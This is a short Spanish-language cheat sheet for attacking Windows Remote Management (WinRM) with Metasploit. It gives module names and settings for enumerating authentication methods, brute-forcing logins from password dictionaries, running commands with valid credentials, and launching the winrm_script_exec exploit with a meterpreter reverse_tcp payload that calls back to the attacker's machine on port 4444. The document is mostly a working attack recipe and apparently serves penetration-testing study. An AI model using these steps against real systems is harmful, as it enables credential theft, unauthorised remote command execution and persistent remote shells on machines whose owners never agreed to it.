Servicio que permite ejecución remota de comandos en sistemas Windows mediante HTTP/HTTPS.

• Requiere credenciales válidas  
• Usa HTTP/HTTPS (5985 / 5986)  
• Permite obtener shell
## Enumeración WinRM

Detecta métodos de autenticación disponibles.

```
use auxiliary/scanner/winrm/winrm_auth_methods
```
## WinRM Login (Brute Force)

Ataque de credenciales contra WinRM.

```
use auxiliary/scanner/winrm/winrm_login
```
	set RHOSTS IP  
	set USER_FILE DICCIONARIO  
	set PASS_FILE DICCIONARIO

## Ejecutar comandos (WinRM)

```
use auxiliary/scanner/winrm/winrm_cmd
```
	set RHOSTS IP  
	set USERNAME USER  
	set PASSWORD PASSWORD  
	set CMD COMMAND

## WinRM Script Exec

Ejecuta comandos remotamente usando WinRM.

```
use exploit/windows/winrm/winrm_script_exec
```
	set RHOSTS IP  
	set RPORT 5985  
	set USERNAME USER  
	set PASSWORD PASSWORD  
	set FORCE_VBS true  
	set PAYLOAD windows/meterpreter/reverse_tcp  
	set LHOST TU_IP  
	set LPORT 4444
